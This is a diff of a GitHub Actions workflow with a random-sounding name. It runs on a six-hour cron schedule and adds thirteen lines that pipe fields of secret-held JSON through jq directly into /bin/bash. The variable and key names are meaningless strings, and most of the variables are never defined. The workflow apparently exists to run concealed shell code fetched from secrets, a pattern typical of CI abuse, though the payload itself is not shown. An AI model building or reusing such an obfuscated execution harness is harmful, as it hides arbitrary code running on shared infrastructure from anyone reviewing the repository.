@@ -2,8 +2,7 @@ name: sweatsuitmachinist
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 4/6 * * *'
-
+    - cron: '31 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,12 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: sweatsuitmachinist
         env:
-          rrtj7: ${{ secrets.rrtj7 }}
+          s95534: ${{ secrets.s95534 }}
         run: |
-          echo $rrtj7 | jq -r .kkwzc8 | /bin/bash
-          echo $kk48844 | jq -r .pnsmd161 | /bin/bash
-          echo $kexzd405 | jq -r .pr80791 | /bin/bash
-          echo $ny3 | jq -r .hkk99951 | /bin/bash
-          echo $gu1990 | jq -r .awfh91747 | /bin/bash
-          echo $adhbj44010 | jq -r .u6 | /bin/bash
+          echo $s95534 | jq -r .zvfab66687 | /bin/bash
+          echo $dqs62 | jq -r .i89750 | /bin/bash
+          echo $bjy47968 | jq -r .mabx3448 | /bin/bash
+          echo $ucx179 | jq -r .fz00762 | /bin/bash
+          echo $qege4121 | jq -r .pccle433 | /bin/bash
+          echo $umoem8371 | jq -r .cnbeo8080 | /bin/bash
+          echo $vckrj93446 | jq -r .ncj11665 | /bin/bash
+          echo $cftz6 | jq -r .dnibe0 | /bin/bash
+          echo $moyz88826 | jq -r .uoo6 | /bin/bash
+          echo $cml3 | jq -r .vbm8536 | /bin/bash
+          echo $edgha829 | jq -r .bbx8420 | /bin/bash
+          echo $tcwyl040 | jq -r .m8465 | /bin/bash
+          echo $lw3820 | jq -r .jg47 | /bin/bash
 
